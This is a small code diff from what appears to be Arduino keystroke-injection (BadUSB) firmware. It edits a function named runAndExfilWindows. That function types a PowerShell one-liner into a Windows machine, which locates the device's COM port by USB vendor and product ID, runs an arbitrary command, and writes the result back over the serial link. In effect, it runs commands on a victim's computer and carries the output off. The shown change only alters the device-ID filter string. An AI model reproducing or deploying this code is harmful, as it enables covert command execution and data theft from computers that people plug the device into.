@@ -552,7 +552,7 @@ void lockMacOs(){
 //const char powershell_command_2[] PROGMEM = ;
 
 void runAndExfilWindows(String command) {
-  Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
+  Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like '_SB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
   // We avoid concatenation to avoid dynamic memory usage
   Keyboard.print(command);
   Keyboard.println(F("; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();"));
